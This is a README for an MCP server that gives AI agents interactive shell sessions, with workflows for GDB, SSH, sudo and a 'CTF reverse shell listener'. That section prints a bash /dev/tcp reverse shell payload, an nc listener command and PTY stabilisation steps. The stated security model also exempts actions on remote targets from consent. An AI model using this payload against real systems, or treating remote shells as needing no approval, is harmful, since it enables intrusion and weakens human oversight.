# terminal-mcp

MCP (Model Context Protocol) server for **long-lived interactive shell sessions** — designed for AI agents executing complex, multi-step workflows that require maintaining state, observing intermediate outputs, and adapting to unpredictable prompts.

## Core Philosophy

Two distinct execution modes, choose the right one:

| Mode | Tool | When to use |
|---|---|---|
| **One-shot** | `exec` | Simple, non-blocking commands with deterministic output (ls, cat, curl, grep...). Process exits after execution. |
| **Interactive loop** | `shell_*` | Stateful, multi-turn operations requiring progressive observation and decision-making: REPLs, debuggers, remote shells, password prompts, reverse shell listeners. |

For any scenario where you cannot predict the exact number of steps or must react to intermediate output, use the **closed loop**:

```
shell_spawn → shell_send_line → shell_output → (observe → decide → send_line → observe ...) → shell_close
```

After every `shell_send_line`, you **must** call `shell_output` to confirm the state before sending the next command. Never batch commands speculatively.

## Features

- **One-shot execution** — `exec` with configurable shell interpreter (bash/sh/zsh/python/node...), timeout, and non-blocking output capture
- **Stateful interactive sessions** — Full lifecycle management across 10 tools: spawn, send, send-line, output, list, exists, reset, close, close-all
- **Long-running process support** — Adjustable `idle_ms` for slow operations (gdb continue, SSH handshake, large downloads); poll-based observation rather than indefinite blocking
- **Built-in prompt templates** — Guided step-by-step workflows for GDB/pwndbg debugging, SSH connections, sudo password handling, and CTF reverse shell listener setup
- **Resource documentation** — Inline guides via `guide://shell/*` URIs (security policy, lifecycle basics, per-scenario recipes)
- **Shell blacklist** — Blocks direct invocation of interactive programs (gdb, ssh, mysql, psql, etc.) as interpreters; enforces the correct spawn-bash-then-send pattern
- **Audit logging** — Every command invocation recorded as structured JSON (trace ID, timing, shell/tag/input, success/failure) to daily rolling logs

## Architecture

```
MCP Client (AI Agent / LLM)
        │
        │ JSON-RPC over stdin/stdout
        ▼
┌─────────────────────────────────────┐
│  rmcp Server (TerminalMcpService)   │
│  ┌───────────────────────────────┐  │
│  │ @tool  » exec                 │  │
│  │ @tool  » shell_spawn          │  │
│  │ @tool  » shell_send           │  │
│  │ @tool  » shell_send_line      │  │
│  │ @tool  » shell_output         │  │
│  │ @tool  » shell_list           │  │
│  │ @tool  » shell_exists         │  │
│  │ @tool  » shell_reset          │  │
│  │ @tool  » shell_close          │  │
│  │ @tool  » shell_close_all      │  │
│  ├───────────────────────────────┤  │
│  │ @prompt » usage/gdb/ssh/rev   │  │
│  ├───────────────────────────────┤  │
│  │ Resources » guide://shell/*   │  │
│  └───────────────────────────────┘  │
│  ┌───────────────────────────────┐  │
│  │ Session Store                 │  │
│  │ DashMap<tag, Arc<Mutex<Shell>>│  │
│  └───────────────────────────────┘  │
│  ┌───────────────────────────────┐  │
│  │ audit::with_audit()           │  │
│  │  → JSON logs per command      │  │
│  └───────────────────────────────┘  │
└─────────────────────────────────────┘
```

## Quick Start

### Build

```bash
cargo build --release
```

### Configure MCP Client

Add to your MCP client configuration (e.g., `opencode.json`):

```json
{
  "mcpServers": {
    "terminal-mcp": {
      "command": "/path/to/terminal-mcp/target/release/terminal-mcp"
    }
  }
}
```

### Environment Variables

| Variable | Default | Description |
|---|---|---|
| `RUST_LOG` | `warn,audit=info` | Log level filter |

## Interactive Session Lifecycle

The `shell_*` family provides fine-grained control over long-lived processes. Understanding the lifecycle is critical for reliable multi-step automation.

### Tag-based Sessions

Each interactive session is identified by a user-defined `tag` (e.g., `"py1"`, `"gdb1"`, `"ssh1"`). Tags allow running multiple independent sessions concurrently.

### Tool Chain

1. **`shell_spawn(shell, tag)`** — Create a session with the specified interpreter (bash/sh/zsh/python/node...). Interactive programs like gdb/ssh must NOT be passed directly as `shell`; spawn bash first, then send the program as a command.

2. **`shell_send_line(input, tag)`** — Send a command with a trailing newline (equivalent to pressing Enter). Returns `"sent"` immediately without output — always follow with `shell_output`.

3. **`shell_send(input, tag)`** — Send raw bytes without a trailing newline. Used for control sequences (e.g., `\x03` = Ctrl+C).

4. **`shell_output(tag, idle_ms)`** — Read buffered stdout/stderr. Waits until output is silent for `idle_ms` (default 200ms) before returning incremental output. **Must be called after every send_line to confirm state.**

5. **`shell_reset(tag)`** — Force-restart a session when stuck in an infinite loop or hung state.

6. **`shell_close(tag)`** — Terminate and remove a session. **Always close sessions when done** to prevent zombie processes.

7. **`shell_close_all`** — Cleanup all active sessions at once.

8. **`shell_list`** — List all active tags with their shell paths.

9. **`shell_exists(tag)`** — Check if a given tag is currently active.

### Output Polling for Long-Running Commands

For operations with uncertain execution time (gdb `continue`, SSH handshake, large file downloads, long compilations):

- **Increase `idle_ms`** to 2000–5000ms to avoid premature cutoff
- **Poll repeatedly** — if expected keywords (e.g., `"Breakpoint"`, `"Last login"`, `"listening on"`) haven't appeared after one `shell_output` call, call it again instead of waiting indefinitely
- **Never batch commands** — always read output before deciding the next action

### Limitations

- **No TUI/GUI programs**: vim, nano, htop, less, and similar programs are unsupported. Use alternatives like cat, head, grep, or ps to inspect state.
- **No pseudo-terminal**: The transport is a raw byte stream. Programs that expect a TTY (e.g., `sudo` password prompt, `ssh` password prompt) **do work** because they read from stdin, but programs that require terminal control sequences (e.g., `top`) will not render correctly.

## Scenarios

### GDB / pwndbg Debugging

A stateful debugging session where every next instruction depends on observing register state, breakpoint hits, and program flow.

```
shell_spawn(shell="bash", tag="gdb1")
shell_send_line(input="gdb ./target_binary", tag="gdb1")
shell_output(tag="gdb1", idle_ms=1000)         ← confirm (gdb) prompt
shell_send_line(input="break main", tag="gdb1")
shell_output(tag="gdb1")                       ← confirm breakpoint set
shell_send_line(input="run", tag="gdb1")
shell_output(tag="gdb1", idle_ms=2000)
shell_send_line(input="next", tag="gdb1")      ← single-step
shell_output(tag="gdb1")
shell_send_line(input="print var", tag="gdb1") ← inspect variable
shell_output(tag="gdb1")
shell_close(tag="gdb1")
```

Key points:
- `continue`/`run` have uncertain execution time — if `"Breakpoint"`/`"hit"`/`"exited"` not seen after `shell_output(idle_ms=3000)`, poll again
- pwndbg may have long startup delay while loading debug symbols — poll `shell_output` repeatedly

### SSH Remote Connection

Multi-turn interactive login with unpredictable intermediate prompts (host key, password, or key-auth skip).

```
shell_spawn(shell="bash", tag="ssh1")
shell_send_line(input="ssh user@host", tag="ssh1")
shell_output(tag="ssh1", idle_ms=1500)
  → "continue connecting (yes/no)?" → shell_send_line("yes")
  → "password:"                    → shell_send_line(password)
  → appears remote prompt          → key auth passed, proceed
```

After login, **every subsequent `shell_send_line` executes on the remote host** until you explicitly `send_line("exit")` to return to the local shell. Always `shell_close(tag="ssh1")` when finished.

### sudo Password Handling

```
shell_spawn(shell="bash", tag="b1")
shell_send_line(input="sudo apt update", tag="b1")
shell_output(tag="b1")
  → "[sudo] password for ..." → shell_send_line(password)
shell_output(tag="b1", idle_ms=1000)          ← increase for slow commands
shell_close(tag="b1")
```

### CTF Reverse Shell Listener

Setting up a local nc listener and stabilizing a reverse connection from a target machine.

**Listener side** (on the agent's machine):
```
shell_spawn(shell="bash", tag="listener")
shell_send_line(input="nc -lvnp 4444", tag="listener")
shell_output(tag="listener", idle_ms=500)     ← expect "listening on [any] 4444"
```

**Target side** (delivered through a web shell / RCE, not via this tool directly):

Payload example:
```bash
bash -i >& /dev/tcp/<ip>/4444 0>&1
```

**After connection established** — the listener session becomes the target's shell:
```
shell_output(tag="listener", idle_ms=2000)    ← observe target prompt
shell_send_line(input="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", tag="listener")
shell_send_line(input="export TERM=xterm", tag="listener")
```

All subsequent commands execute on the target. Observe output before each next step. `shell_close(tag="listener")` when done.

## Tools Reference

| Tool | Description | Key Parameters |
|---|---|---|
| `exec` | One-shot command execution, process exits after completion | `input`, `shell` (default: bash), `timeout_ms` |
| `shell_spawn` | Create an interactive session | `shell`, `tag` |
| `shell_send_line` | Send command + newline (most common) | `input`, `tag` |
| `shell_send` | Send raw bytes, no newline (e.g., Ctrl+C) | `input`, `tag` |
| `shell_output` | Read buffered stdout/stderr | `idle_ms`, `tag` |
| `shell_list` | List all active sessions | — |
| `shell_exists` | Check if a tag exists | `tag` |
| `shell_reset` | Kill and restart a session | `tag` |
| `shell_close` | Close a single session | `tag` |
| `shell_close_all` | Close all sessions | — |

## Prompt Templates

Built-in prompts generate step-by-step instructions for AI agents:

| Prompt | Parameters | Description |
|---|---|---|
| `shell_usage_guide` | — | Core principles: when to use exec vs interactive sessions |
| `gdb_debug_session` | `binary_path`, `tag?` | Full GDB/pwndbg debugging workflow |
| `ssh_connect_session` | `host`, `user`, `tag?` | SSH connection with multi-step authentication |
| `reverse_shell_session` | `attacker_ip`, `port?`, `tag?` | CTF reverse shell listener setup |

## Resources

Inline documentation accessible by AI agents via `read_resource`:

| URI | Content |
|---|---|
| `guide://shell/security` | Security guidelines — must read first |
| `guide://shell/basics` | Session lifecycle and best practices |
| `guide://shell/gdb` | GDB/pwndbg debugging workflow |
| `guide://shell/ssh` | SSH remote connection workflow |
| `guide://shell/sudo` | sudo password/confirmation handling |
| `guide://shell/reverse_shell` | Reverse shell listener workflow |

## Security Model

- **Audit trails**: Every `exec` / `shell_spawn` / `shell_send` / `shell_send_line` call is fully recorded with command content, shell type, tag, and timing
- **Explicit consent**: Destructive operations, privilege escalation, network exposure, and persistent changes require user approval before execution
- **Read-only by default**: Commands like ls, cat, grep, ps, df that do not modify state can execute directly
- **Remote operations**: SSH sessions and reverse shells inherently operate on remote targets and are exempt from local consent (unless they write to local disk or tunnel back)

Full security policy available at `guide://shell/security`.

## Audit Logs

All tool calls are logged as structured JSON to `logs/terminal_audit.log` (daily rolling) with:

- `trace_id` — UUID v4 per invocation
- `action` — tool name
- `shell`, `tag`, `input` — command context
- `begin` / `end` events with duration and success/failure status

## License

[MIT](LICENSE)